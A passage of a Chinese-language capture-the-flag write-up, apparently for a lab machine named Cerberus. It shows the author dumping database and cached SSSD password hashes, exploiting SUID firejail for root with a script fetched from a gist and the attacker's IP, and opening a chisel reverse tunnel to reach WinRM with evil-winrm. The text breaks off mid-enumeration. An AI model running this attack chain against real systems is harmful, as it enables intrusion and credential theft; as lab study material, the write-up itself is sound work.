+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@icinga:/usr/share/icingaweb2/public$ mysql -u matthew -p<span style="color:#e6db74">&#39;IcingaWebPassword2023&#39;</span> -h 127.0.0.1 icingaweb2 -e <span style="color:#e6db74">&#34;show tables;&#34;</span>
+</span></span><span style="display:flex;"><span>&lt;word2023<span style="color:#960050;background-color:#1e0010">&#39;</span> -h 127.0.0.1 icingaweb2 -e <span style="color:#e6db74">&#34;show tables;&#34;</span>
+</span></span><span style="display:flex;"><span>+----------------------------+
+</span></span><span style="display:flex;"><span>| Tables_in_icingaweb2       |
+</span></span><span style="display:flex;"><span>+----------------------------+
+</span></span><span style="display:flex;"><span>| icingaweb_group            |
+</span></span><span style="display:flex;"><span>| icingaweb_group_membership |
+</span></span><span style="display:flex;"><span>| icingaweb_rememberme       |
+</span></span><span style="display:flex;"><span>| icingaweb_user             |
+</span></span><span style="display:flex;"><span>| icingaweb_user_preference  |
+</span></span><span style="display:flex;"><span>+----------------------------+
+</span></span></code></pre></div><p>查询权限，权限很干净。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@icinga:/usr/share/icingaweb2/public$ mysql -u matthew -p<span style="color:#e6db74">&#39;IcingaWebPassword2023&#39;</span> -h 127.0.0.1 -e <span style="color:#e6db74">&#34;show grants;&#34;</span>
+</span></span><span style="display:flex;"><span>&lt;ingaWebPassword2023<span style="color:#e6db74">&#39; -h 127.0.0.1 -e &#34;show grants;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+----------------------------------------------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Grants for matthew@localhost                                                                                   |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+----------------------------------------------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| GRANT USAGE ON *.* TO `matthew`@`localhost` IDENTIFIED BY PASSWORD &#39;</span>*48BBE5BAD61013B6B03BE9043BDF711D6D67ED3F<span style="color:#960050;background-color:#1e0010">&#39;</span> |
+</span></span><span style="display:flex;"><span>| GRANT ALL PRIVILEGES ON <span style="color:#e6db74">`</span>icingaweb2<span style="color:#e6db74">`</span>.* TO <span style="color:#e6db74">`</span>matthew<span style="color:#e6db74">`</span>@<span style="color:#e6db74">`</span>localhost<span style="color:#e6db74">`</span>                                                |
+</span></span><span style="display:flex;"><span>+----------------------------------------------------------------------------------------------------------------+
+</span></span></code></pre></div><p>查表的细节，查询到了 hash，但是已经有了明文密码了，这个信息没什么用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@icinga:/usr/share/icingaweb2/public$ mysql -u matthew -p<span style="color:#e6db74">&#39;IcingaWebPassword2023&#39;</span> -h 127.0.0.1 icingaweb2 -e <span style="color:#e6db74">&#34;select * from icingaweb_user;&#34;</span>
+</span></span><span style="display:flex;"><span>&lt;0.0.1 icingaweb2 -e <span style="color:#e6db74">&#34;select * from icingaweb_user;&#34;</span>
+</span></span><span style="display:flex;"><span>+---------+--------+--------------------------------------------------------------+---------------------+-------+
+</span></span><span style="display:flex;"><span>| name    | active | password_hash                                                | ctime               | mtime |
+</span></span><span style="display:flex;"><span>+---------+--------+--------------------------------------------------------------+---------------------+-------+
+</span></span><span style="display:flex;"><span>| matthew |      <span style="color:#ae81ff">1</span> | $2y$10$XL4/y9uLpQqGA5lB0PTxreAnounQo.OR39REJIZ8NB/D6Xn4KQpVu | 2023-01-26 15:20:37 | NULL  |
+</span></span><span style="display:flex;"><span>+---------+--------+--------------------------------------------------------------+---------------------+-------+
+</span></span></code></pre></div><p>查看具有 sid 的可执行文件，发现一个易受攻击的组件 firejail。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@icinga:/usr/share/icingaweb2/public$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>&lt;aweb2/public$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/sbin/ccreds_chkpwd
+</span></span><span style="display:flex;"><span>/usr/bin/mount
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/firejail
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/fusermount3
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/ksu
+</span></span><span style="display:flex;"><span>/usr/bin/pkexec
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/su
+</span></span><span style="display:flex;"><span>/usr/bin/umount
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/libexec/polkit-agent-helper-1
+</span></span></code></pre></div><p>下载提权脚本到 Kali 工作目录。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus/payload<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -sSL https://gist.githubusercontent.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25/raw -o fj.py
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus/payload<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>fj.py
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus/payload<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ file fj.py
+</span></span><span style="display:flex;"><span>fj.py: Python script, ASCII text executable
+</span></span></code></pre></div><p>复制到 www-data。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ww-data@icinga:/tmp/apps$ curl -o /tmp/apps/fj.py http://10.10.16.151:80/fj.py
+</span></span><span style="display:flex;"><span>&lt;url -o /tmp/apps/fj.py http://10.10.16.151:80/fj.py
+</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>  <span style="color:#ae81ff">7954</span>    <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">7954</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">28925</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:-- <span style="color:#ae81ff">29029</span>
+</span></span><span style="display:flex;"><span>www-data@icinga:/tmp/apps$ ls -liah
+</span></span><span style="display:flex;"><span>ls -liah
+</span></span><span style="display:flex;"><span>total 16K
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">16461</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> www-data www-data 4.0K Nov  <span style="color:#ae81ff">4</span> 01:54 .
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">20</span> drwxrwxrwt <span style="color:#ae81ff">13</span> root     root     4.0K Nov  <span style="color:#ae81ff">4</span> 01:53 ..
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1146</span> -rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data 7.8K Nov  <span style="color:#ae81ff">4</span> 01:54 fj.py
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@icinga:/tmp/apps$ ls -liah
+</span></span><span style="display:flex;"><span>ls -liah
+</span></span><span style="display:flex;"><span>total 16K
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">16461</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> www-data www-data 4.0K Nov  <span style="color:#ae81ff">4</span> 01:54 .
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">20</span> drwxrwxrwt <span style="color:#ae81ff">13</span> root     root     4.0K Nov  <span style="color:#ae81ff">4</span> 01:53 ..
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1146</span> -rwxr-xr-x  <span style="color:#ae81ff">1</span> www-data www-data 7.8K Nov  <span style="color:#ae81ff">4</span> 01:54 fj.py
+</span></span></code></pre></div><p>后台跑起来，并用一根永远不会关闭的输入管道吊住标准输出。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@icinga:/tmp/apps$ tail -f /dev/null | python3 /tmp/apps/fj.py &gt; /tmp/apps/fj.out 2&gt;&amp;<span style="color:#ae81ff">1</span> &amp;
+</span></span><span style="display:flex;"><span>&lt;| python3 /tmp/apps/fj.py &gt; /tmp/apps/fj.out 2&gt;&amp;<span style="color:#ae81ff">1</span> &amp;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">1254</span>
+</span></span></code></pre></div><p>读取 <code>fj.out</code>，它告诉我们下一步应该执行什么。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@icinga:/tmp/apps$ cat fj.out
+</span></span><span style="display:flex;"><span>cat fj.out
+</span></span><span style="display:flex;"><span>You can now run <span style="color:#e6db74">&#39;firejail --join=1774&#39;</span> in another terminal to obtain a shell where <span style="color:#e6db74">&#39;sudo su -&#39;</span> should grant you a root shell.
+</span></span></code></pre></div><p>执行获得 root 权限。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@icinga:/tmp/apps$ firejail --join<span style="color:#f92672">=</span><span style="color:#ae81ff">1774</span>
+</span></span><span style="display:flex;"><span>firejail --join<span style="color:#f92672">=</span><span style="color:#ae81ff">1774</span>
+</span></span><span style="display:flex;"><span>changing root to /proc/1774/root
+</span></span><span style="display:flex;"><span>Warning: cleaning all supplementary groups
+</span></span><span style="display:flex;"><span>Child process initialized in 6.59 ms
+</span></span><span style="display:flex;"><span>www-data@icinga:/tmp/apps$ su -
+</span></span><span style="display:flex;"><span>su -
+</span></span><span style="display:flex;"><span>root@icinga:~# whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>查看 ip，虚拟网卡 MAC 的前缀 <code>00:15:5d</code> 指向 Hyper-V，说明这是一台虚拟机</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@icinga:~# ip a
+</span></span><span style="display:flex;"><span>ip a
+</span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN group default qlen <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    inet6 ::1/128 scope host 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc mq state UP group default qlen <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span>    link/ether 00:15:5d:5f:e8:01 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    inet 172.16.22.2/28 brd 172.16.22.15 scope global eth0
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    inet6 fe80::215:5dff:fe5f:e801/64 scope link 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span></code></pre></div><h2 id="提权至-matthew">提权至 matthew</h2>
+<p>查看进程，出现了 sssd，且参数是 <code>--domain cerberus.local</code>，说明这台机器加入了域。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@icinga:~# ps auxww | grep -i sssd
+</span></span><span style="display:flex;"><span>ps auxww | grep -i sssd
+</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">551</span>  0.0  1.3  <span style="color:#ae81ff">93916</span> <span style="color:#ae81ff">12420</span> ?        Ss   01:41   0:00 /usr/sbin/sssd -i --logger<span style="color:#f92672">=</span>files
+</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">845</span>  0.0  1.7  <span style="color:#ae81ff">98216</span> <span style="color:#ae81ff">15276</span> ?        S    01:41   0:00 /usr/libexec/sssd/sssd_be --domain cerberus.local --uid <span style="color:#ae81ff">0</span> --gid <span style="color:#ae81ff">0</span> --logger<span style="color:#f92672">=</span>files
+</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">964</span>  0.0  1.7 <span style="color:#ae81ff">109128</span> <span style="color:#ae81ff">15412</span> ?        S    01:41   0:00 /usr/libexec/sssd/sssd_nss --uid <span style="color:#ae81ff">0</span> --gid <span style="color:#ae81ff">0</span> --logger<span style="color:#f92672">=</span>files
+</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">965</span>  0.0  1.5  <span style="color:#ae81ff">83340</span> <span style="color:#ae81ff">13628</span> ?        S    01:41   0:00 /usr/libexec/sssd/sssd_pam --uid <span style="color:#ae81ff">0</span> --gid <span style="color:#ae81ff">0</span> --logger<span style="color:#f92672">=</span>files
+</span></span><span style="display:flex;"><span>root        <span style="color:#ae81ff">1874</span>  0.0  0.1   <span style="color:#ae81ff">3468</span>  <span style="color:#ae81ff">1552</span> pts/0    S+   02:26   0:00 grep --color<span style="color:#f92672">=</span>auto -i sssd
+</span></span></code></pre></div><p>SSSD 的数据目录是按照域名命名的 ldb 文件，域用户缓存就在其中。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@icinga:~# ls -la /var/lib/sss/db/
+</span></span><span style="display:flex;"><span>ls -la /var/lib/sss/db/
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">5036</span>
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root    <span style="color:#ae81ff">4096</span> Mar  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2023</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">10</span> root root    <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2023</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1286144</span> Nov  <span style="color:#ae81ff">4</span> 01:41 cache_cerberus.local.ldb
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">2715</span> Mar  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2023</span> ccache_CERBERUS.LOCAL
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1286144</span> Nov  <span style="color:#ae81ff">4</span> 01:41 config.ldb
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1286144</span> Jan <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2023</span> sssd.ldb
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1286144</span> Mar  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2023</span> timestamps_cerberus.local.ldb
+</span></span></code></pre></div><p>缓存中发现了 <code>matthew</code> 的 sha512crypt hash。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@icinga:~# strings /var/lib/sss/db/cache_cerberus.local.ldb | grep -B6 -A3 -i cachedPassword                                     
+</span></span><span style="display:flex;"><span>&lt;cerberus.local.ldb | grep -B6 -A3 -i cachedPassword                                                                                 
+</span></span><span style="display:flex;"><span>isPosix                                                                                                                              
+</span></span><span style="display:flex;"><span>TRUE                                                                                                                                 
+</span></span><span style="display:flex;"><span>lastUpdate                                                                                                                           
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1677672476</span>                                                                                                                           
+</span></span><span style="display:flex;"><span>dataExpireTimestamp                                                                                                                  
+</span></span><span style="display:flex;"><span>initgrExpireTimestamp                                                                                                                
+</span></span><span style="display:flex;"><span>cachedPassword                                                                                                                       
+</span></span><span style="display:flex;"><span>$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0                           
+</span></span><span style="display:flex;"><span>cachedPasswordType                                                                                                                   
+</span></span><span style="display:flex;"><span>lastCachedPasswordChange                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1677672476</span>                                                                                                                           
+</span></span><span style="display:flex;"><span>failedLoginAttempts                                                                                                                  
+</span></span><span style="display:flex;"><span>aExpireTimestamp 
+</span></span><span style="display:flex;"><span>isPosix                                                                                                                              
+</span></span><span style="display:flex;"><span>TRUE
+</span></span><span style="display:flex;"><span>lastUpdate
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1677672476</span>
+</span></span><span style="display:flex;"><span>dataExpireTimestamp
+</span></span><span style="display:flex;"><span>initgrExpireTimestamp
+</span></span><span style="display:flex;"><span>cachedPassword
+</span></span><span style="display:flex;"><span>$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
+</span></span><span style="display:flex;"><span>cachedPasswordType
+</span></span><span style="display:flex;"><span>lastCachedPasswordChange
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1677672476</span>
+</span></span><span style="display:flex;"><span>failedLoginAttempts
+</span></span><span style="display:flex;"><span>aExpireTimestamp
+</span></span><span style="display:flex;"><span>--
+</span></span><span style="display:flex;"><span>isPosix
+</span></span><span style="display:flex;"><span>TRUE
+</span></span><span style="display:flex;"><span>lastUpdate
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1677672476</span>
+</span></span><span style="display:flex;"><span>dataExpireTimestamp
+</span></span><span style="display:flex;"><span>initgrExpireTimestamp
+</span></span><span style="display:flex;"><span>cachedPassword
+</span></span><span style="display:flex;"><span>$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
+</span></span><span style="display:flex;"><span>cachedPasswordType
+</span></span><span style="display:flex;"><span>lastCachedPasswordChange
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1677672476</span>
+</span></span><span style="display:flex;"><span>failedLoginAttempts
+</span></span><span style="display:flex;"><span>aExpireTimestamp
+</span></span></code></pre></div><p>再次确认网段。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@icinga:~# ip a
+</span></span><span style="display:flex;"><span>ip a
+</span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN group default qlen <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    inet6 ::1/128 scope host 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc mq state UP group default qlen <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span>    link/ether 00:15:5d:5f:e8:01 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    inet 172.16.22.2/28 brd 172.16.22.15 scope global eth0
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    inet6 fe80::215:5dff:fe5f:e801/64 scope link 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span></code></pre></div><p>宿主机的 5985 是存活的。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@icinga:~# timeout <span style="color:#ae81ff">3</span> bash -c <span style="color:#e6db74">&#39;echo &gt; /dev/tcp/172.16.22.1/5985&#39;</span> <span style="color:#f92672">&amp;&amp;</span> echo WINRM_OPEN
+</span></span><span style="display:flex;"><span>&lt;cho &gt; /dev/tcp/172.16.22.1/5985<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">&amp;&amp;</span> echo WINRM_OPEN
+</span></span><span style="display:flex;"><span>WINRM_OPEN
+</span></span></code></pre></div><p>准备好 chisel</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@icinga:/tmp/apps# ls -liah chisel
+</span></span><span style="display:flex;"><span>ls -liah chisel
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1674</span> -rwxr-xr-x <span style="color:#ae81ff">1</span> root root 11M Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2026</span> chisel
+</span></span></code></pre></div><p>用 chisel 起客户端，把宿主的 WinRM 端口映射至 Kali 本地。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@icinga:/tmp/apps# /tmp/apps/chisel client 10.10.16.151:8000 R:5985:172.16.22.1:5985
+</span></span><span style="display:flex;"><span>&lt;el client 10.10.16.151:8000 R:5985:172.16.22.1:5985
+</span></span><span style="display:flex;"><span>2026/11/04 02:39:25 client: Connecting to ws://10.10.16.151:8000
+</span></span><span style="display:flex;"><span>2026/11/04 02:39:27 client: Connected <span style="color:#f92672">(</span>Latency 261.5021ms<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>在 Kali 侧开服务端并启动反向隧道。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ chisel server -p <span style="color:#ae81ff">8000</span> --reverse
+</span></span><span style="display:flex;"><span>2026/11/03 21:37:23 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span>2026/11/03 21:37:23 server: Fingerprint YK/t+mIbfh9OlYWVhd+YQ+7/5nxqAjAFtUJsWCJPLCA<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>2026/11/03 21:37:23 server: Listening on http://0.0.0.0:8000
+</span></span><span style="display:flex;"><span>2026/11/03 21:40:46 server: session#1: tun: proxy#R:5985<span style="color:#f92672">=</span>&gt;172.16.22.1:5985: Listening
+</span></span></code></pre></div><p>使用 evil-winrm 登录得到 matthew。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/usr/bin<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 127.0.0.1 -u matthew -p <span style="color:#ae81ff">147258369</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>atthew<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>cerberus<span style="color:#ae81ff">\m</span>atthew
+</span></span></code></pre></div><h2 id="提权至-administrator">提权至 Administrator</h2>
+<p>本机账号列表只有四个。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>atthew<span style="color:#ae81ff">\D</span>esktop&gt; net users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User accounts <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">\\</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>Administrator            Guest                    krbtgt
+</span></span><span style="display:flex;"><span>matthew
+</span></span><span style="display:flex;"><span>The command completed with one or more errors.
+</span></span></code></pre></div><p>查看完整的账号权限。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>atthew<span style="color:#ae81ff">\D</span>esktop&gt; whoami /all                                                                                
+</span></span><span style="display:flex;"><span>                                                                                                                                     
+</span></span><span style="display:flex;"><span>                                                                                                                                     
+</span></span><span style="display:flex;"><span>USER INFORMATION                                                                                                                     
+</span></span><span style="display:flex;"><span>----------------                                                                                                                     
+</span></span><span style="display:flex;"><span>                                                                                                                                     
+</span></span><span style="display:flex;"><span>User Name        SID                                                                                                                 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span> <span style="color:#f92672">==============================================</span>                                                                      
+</span></span><span style="display:flex;"><span>cerberus<span style="color:#ae81ff">\m</span>atthew S-1-5-21-4088429403-1159899800-2753317549-1104                                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                                     
+</span></span><span style="display:flex;"><span>                                                                                                                                     
+</span></span><span style="display:flex;"><span>GROUP INFORMATION                                                                                                                    
+</span></span><span style="display:flex;"><span>-----------------                                                                                                                    
